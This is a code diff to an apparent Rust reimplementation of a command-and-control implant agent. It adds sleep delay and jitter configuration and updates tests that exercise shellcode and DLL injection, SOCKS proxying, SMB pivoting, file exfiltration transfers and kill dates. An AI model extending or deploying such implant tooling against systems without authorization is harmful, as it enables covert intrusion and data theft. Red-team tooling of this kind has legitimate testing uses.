@@ -20,6 +20,7 @@ use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
 use tokio::process::Command;
 
+use crate::config::PhantomConfig;
 use crate::error::PhantomError;
 use crate::parser::TaskParser;
 use crate::protocol::executable_name;
@@ -816,16 +817,20 @@ impl MemFile {
 /// Execute a single Demon task package.
 pub(crate) async fn execute(
     package: &DemonPackage,
+    config: &mut PhantomConfig,
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     match package.command()? {
         DemonCommand::CommandNoJob => {}
         DemonCommand::CommandSleep => {
             let mut parser = TaskParser::new(&package.payload);
-            let sleep_ms = parser.int32()?;
+            let delay_ms = u32::try_from(parser.int32()?).unwrap_or(0);
+            let jitter = u32::try_from(parser.int32().unwrap_or(0)).unwrap_or(0).min(100);
+            config.sleep_delay_ms = delay_ms;
+            config.sleep_jitter = jitter;
             state.queue_callback(PendingCallback::Output {
                 request_id: package.request_id,
-                text: format!("sleep updated to {sleep_ms} ms"),
+                text: format!("sleep updated to {delay_ms} ms"),
             });
         }
         DemonCommand::CommandFs => {
@@ -4003,6 +4008,7 @@ mod tests {
         SessionEntry, UserEntry, execute, parse_group_entries, parse_logged_on_sessions,
         parse_logged_on_users, parse_memory_region, parse_user_entries,
     };
+    use crate::config::PhantomConfig;
 
     fn utf16_payload(value: &str) -> Vec<u8> {
         let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
@@ -4069,8 +4075,60 @@ mod tests {
     async fn command_no_job_returns_no_callbacks() {
         let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
         let mut state = PhantomState::default();
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
         assert!(state.drain_callbacks().is_empty());
+    }
+
+    #[tokio::test]
+    async fn command_sleep_updates_config_and_queues_callback() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&3000_i32.to_le_bytes());
+        payload.extend_from_slice(&25_i32.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 7, payload);
+        let mut config = PhantomConfig::default();
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut config, &mut state).await.expect("execute");
+
+        assert_eq!(config.sleep_delay_ms, 3000, "sleep_delay_ms must be updated");
+        assert_eq!(config.sleep_jitter, 25, "sleep_jitter must be updated");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
+            panic!("expected one Output callback, got: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 7);
+        assert!(text.contains("3000"), "callback text should mention new delay: {text}");
+    }
+
+    #[tokio::test]
+    async fn command_sleep_clamps_jitter_to_100() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&1000_i32.to_le_bytes());
+        payload.extend_from_slice(&150_i32.to_le_bytes()); // over 100
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
+        let mut config = PhantomConfig::default();
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut config, &mut state).await.expect("execute");
+
+        assert_eq!(config.sleep_delay_ms, 1000);
+        assert_eq!(config.sleep_jitter, 100, "jitter exceeding 100 must be clamped");
+    }
+
+    #[tokio::test]
+    async fn command_sleep_missing_jitter_defaults_to_zero() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&2000_i32.to_le_bytes());
+        // no jitter field
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 2, payload);
+        let mut config = PhantomConfig { sleep_jitter: 10, ..PhantomConfig::default() };
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut config, &mut state).await.expect("execute");
+
+        assert_eq!(config.sleep_delay_ms, 2000);
+        assert_eq!(config.sleep_jitter, 0, "missing jitter field must default to 0");
     }
 
     #[tokio::test]
@@ -4080,7 +4138,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4109,7 +4167,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [
@@ -4139,7 +4197,7 @@ mod tests {
             DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4164,7 +4222,7 @@ mod tests {
         );
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4188,7 +4246,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandNet, 9, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4215,7 +4273,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandNet, 10, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4240,7 +4298,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, request_id, payload }] =
@@ -4282,12 +4340,20 @@ mod tests {
         upload.extend_from_slice(&77_i32.to_le_bytes());
 
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile), &mut state)
-            .await
-            .expect("memfile");
-        execute(&DemonPackage::new(DemonCommand::CommandFs, 4, upload), &mut state)
-            .await
-            .expect("upload");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("memfile");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandFs, 4, upload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("upload");
 
         let callbacks = state.drain_callbacks();
         assert!(matches!(
@@ -4315,9 +4381,13 @@ mod tests {
         payload.extend_from_slice(&8080_i32.to_le_bytes());
 
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 5, payload), &mut state)
-            .await
-            .expect("socket");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 5, payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socket");
 
         assert!(matches!(
             state.drain_callbacks().as_slice(),
@@ -4349,9 +4419,13 @@ mod tests {
         payload.extend_from_slice(&(i32::from(target_port)).to_le_bytes());
 
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 6, payload), &mut state)
-            .await
-            .expect("socket");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 6, payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socket");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { request_id: 6, payload }] = callbacks.as_slice() else {
@@ -4395,9 +4469,13 @@ mod tests {
         add_payload.extend_from_slice(&0_i32.to_le_bytes());
 
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload), &mut state)
-            .await
-            .expect("socks add");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks add");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { request_id: 7, payload }] = callbacks.as_slice() else {
@@ -4414,9 +4492,13 @@ mod tests {
         assert_eq!(state.socks_proxies.len(), 1);
 
         let list_payload = (DemonSocketCommand::SocksProxyList as i32).to_le_bytes().to_vec();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload), &mut state)
-            .await
-            .expect("socks list");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks list");
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { request_id: 8, payload }] = callbacks.as_slice() else {
             panic!("unexpected callbacks: {callbacks:?}");
@@ -4431,9 +4513,13 @@ mod tests {
         remove_payload
             .extend_from_slice(&(DemonSocketCommand::SocksProxyRemove as i32).to_le_bytes());
         remove_payload.extend_from_slice(&socket_id.to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload), &mut state)
-            .await
-            .expect("socks remove");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks remove");
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { request_id: 9, payload }] = callbacks.as_slice() else {
             panic!("unexpected callbacks: {callbacks:?}");
@@ -4447,15 +4533,23 @@ mod tests {
         add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
         add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
         add_payload.extend_from_slice(&0_i32.to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload), &mut state)
-            .await
-            .expect("socks add");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks add");
         let _ = state.drain_callbacks();
 
         let clear_payload = (DemonSocketCommand::SocksProxyClear as i32).to_le_bytes().to_vec();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload), &mut state)
-            .await
-            .expect("socks clear");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks clear");
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { request_id: 11, payload }] = callbacks.as_slice() else {
             panic!("unexpected callbacks: {callbacks:?}");
@@ -4483,9 +4577,13 @@ mod tests {
         add_payload.extend_from_slice(&0_i32.to_le_bytes());
 
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload), &mut state)
-            .await
-            .expect("socks add");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("socks add");
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Socket { payload, .. }] = callbacks.as_slice() else {
             panic!("unexpected callbacks: {callbacks:?}");
@@ -4650,7 +4748,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandFs, 42, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -4681,7 +4779,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandFs, 50, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
         state.drain_callbacks(); // drain the FileOpen
 
         // Poll to push chunks.
@@ -4759,9 +4857,13 @@ mod tests {
         fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
         fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
-            .await
-            .expect("download");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("download");
         state.drain_callbacks();
 
         let file_id = state.downloads[0].file_id;
@@ -4771,6 +4873,7 @@ mod tests {
         transfer_payload.extend_from_slice(&(DemonTransferCommand::List as i32).to_le_bytes());
         execute(
             &DemonPackage::new(DemonCommand::CommandTransfer, 10, transfer_payload),
+            &mut PhantomConfig::default(),
             &mut state,
         )
         .await
@@ -4803,9 +4906,13 @@ mod tests {
         fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
         fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
-            .await
-            .expect("download");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("download");
         state.drain_callbacks();
 
         let file_id = state.downloads[0].file_id;
@@ -4814,9 +4921,13 @@ mod tests {
         let mut stop_payload = Vec::new();
         stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
         stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
-            .await
-            .expect("transfer stop");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("transfer stop");
 
         assert_eq!(state.downloads[0].state, DownloadTransferState::Stopped);
 
@@ -4845,9 +4956,13 @@ mod tests {
         fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
         fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
-            .await
-            .expect("download");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("download");
         state.drain_callbacks();
 
         let file_id = state.downloads[0].file_id;
@@ -4856,17 +4971,25 @@ mod tests {
         let mut stop_payload = Vec::new();
         stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
         stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
-            .await
-            .expect("stop");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("stop");
         state.drain_callbacks();
 
         let mut resume_payload = Vec::new();
         resume_payload.extend_from_slice(&(DemonTransferCommand::Resume as i32).to_le_bytes());
         resume_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload), &mut state)
-            .await
-            .expect("resume");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("resume");
 
         assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
         state.drain_callbacks();
@@ -4890,9 +5013,13 @@ mod tests {
         fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
         fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
         let mut state = PhantomState::default();
-        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
-            .await
-            .expect("download");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("download");
         state.drain_callbacks();
 
         let file_id = state.downloads[0].file_id;
@@ -4901,9 +5028,13 @@ mod tests {
         let mut remove_payload = Vec::new();
         remove_payload.extend_from_slice(&(DemonTransferCommand::Remove as i32).to_le_bytes());
         remove_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload), &mut state)
-            .await
-            .expect("transfer remove");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("transfer remove");
 
         // Should produce two callbacks: the action response and the close notification.
         let callbacks = state.drain_callbacks();
@@ -4925,9 +5056,13 @@ mod tests {
         let mut stop_payload = Vec::new();
         stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
         stop_payload.extend_from_slice(&(0xDEAD_BEEF_u32 as i32).to_le_bytes());
-        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload), &mut state)
-            .await
-            .expect("transfer stop nonexistent");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("transfer stop nonexistent");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
@@ -4950,7 +5085,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandFs, 55, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Structured { command_id, .. }] = callbacks.as_slice() else {
@@ -4968,7 +5103,9 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandKillDate, 50, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute kill date");
+        execute(&package, &mut PhantomConfig::default(), &mut state)
+            .await
+            .expect("execute kill date");
         assert_eq!(state.kill_date(), Some(timestamp));
 
         let callbacks = state.drain_callbacks();
@@ -4986,7 +5123,9 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandKillDate, 51, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute kill date zero");
+        execute(&package, &mut PhantomConfig::default(), &mut state)
+            .await
+            .expect("execute kill date zero");
         assert_eq!(state.kill_date(), None);
 
         let callbacks = state.drain_callbacks();
@@ -5003,13 +5142,13 @@ mod tests {
         // Set initial kill date.
         let payload = 1_800_000_000_i64.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandKillDate, 60, payload);
-        execute(&package, &mut state).await.expect("set initial");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("set initial");
         state.drain_callbacks();
 
         // Update to a new kill date.
         let payload = 1_900_000_000_i64.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandKillDate, 61, payload);
-        execute(&package, &mut state).await.expect("update");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("update");
         assert_eq!(state.kill_date(), Some(1_900_000_000));
     }
 
@@ -5045,7 +5184,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.kill_date(), Some(1_700_000_000));
 
@@ -5070,7 +5209,7 @@ mod tests {
         let mut state = PhantomState::default();
         state.kill_date = Some(1_700_000_000);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.kill_date(), None);
     }
@@ -5083,7 +5222,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.working_hours(), Some(hours));
 
@@ -5108,7 +5247,7 @@ mod tests {
         let mut state = PhantomState::default();
         state.working_hours = Some(12345);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.working_hours(), None);
     }
@@ -5120,7 +5259,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
@@ -5136,7 +5275,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
@@ -5178,7 +5317,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandPivot, 1, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5208,7 +5347,7 @@ mod tests {
 
         let payload = pivot_payload(DemonPivotCommand::List, &[]);
         let package = DemonPackage::new(DemonCommand::CommandPivot, 2, payload);
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5260,7 +5399,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandPivot, 10, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5284,7 +5423,7 @@ mod tests {
         disc_extra.extend_from_slice(&(child_agent_id as i32).to_le_bytes());
         let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &disc_extra);
         let package = DemonPackage::new(DemonCommand::CommandPivot, 11, payload);
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5313,7 +5452,7 @@ mod tests {
         let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &extra);
         let package = DemonPackage::new(DemonCommand::CommandPivot, 12, payload);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5350,7 +5489,7 @@ mod tests {
         let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
         let package = DemonPackage::new(DemonCommand::CommandPivot, 20, payload);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         // No structured callback for SmbCommand (matches Demon behaviour).
         let callbacks = state.drain_callbacks();
@@ -5377,7 +5516,7 @@ mod tests {
         let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
         let package = DemonPackage::new(DemonCommand::CommandPivot, 21, payload);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5393,7 +5532,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandPivot, 30, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5489,7 +5628,7 @@ mod tests {
     async fn screenshot_dispatcher_routes_command_and_queues_callback() {
         let mut state = PhantomState::default();
         let package = DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
-        let result = execute(&package, &mut state).await;
+        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
         assert!(result.is_ok(), "execute must not return an error");
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1, "exactly one callback expected");
@@ -5633,7 +5772,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x10, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5662,7 +5801,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x20, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5688,7 +5827,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x30, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5714,7 +5853,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x40, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5734,7 +5873,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x50, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5753,7 +5892,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 0x60, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5777,6 +5916,7 @@ mod tests {
             build_inject_shellcode_payload(super::INJECT_WAY_EXECUTE, 0, 1, &[], &[], 0);
         execute(
             &DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, sc_payload),
+            &mut PhantomConfig::default(),
             &mut state,
         )
         .await
@@ -5784,15 +5924,23 @@ mod tests {
 
         // Inject DLL with empty payload.
         let dll_payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
-        execute(&DemonPackage::new(DemonCommand::CommandInjectDll, 2, dll_payload), &mut state)
-            .await
-            .expect("execute dll");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandInjectDll, 2, dll_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("execute dll");
 
         // Spawn DLL with empty payload.
         let spawn_payload = build_spawn_dll_payload(&[], &[], &[]);
-        execute(&DemonPackage::new(DemonCommand::CommandSpawnDll, 3, spawn_payload), &mut state)
-            .await
-            .expect("execute spawn dll");
+        execute(
+            &DemonPackage::new(DemonCommand::CommandSpawnDll, 3, spawn_payload),
+            &mut PhantomConfig::default(),
+            &mut state,
+        )
+        .await
+        .expect("execute spawn dll");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 3);
@@ -5830,7 +5978,7 @@ mod tests {
         let package = DemonPackage::new(command, 77, Vec::new());
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         let callbacks = state.drain_callbacks();
         let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
@@ -5885,7 +6033,9 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
         let mut state = PhantomState::default();
 
-        execute(&package, &mut state).await.expect("execute package dropped");
+        execute(&package, &mut PhantomConfig::default(), &mut state)
+            .await
+            .expect("execute package dropped");
 
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
@@ -5919,7 +6069,7 @@ mod tests {
         payload.extend_from_slice(&(65_536_i32).to_le_bytes());
         let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.downloads[0].state, DownloadTransferState::Remove);
 
@@ -5948,7 +6098,7 @@ mod tests {
         // Different request_id — should not touch the download.
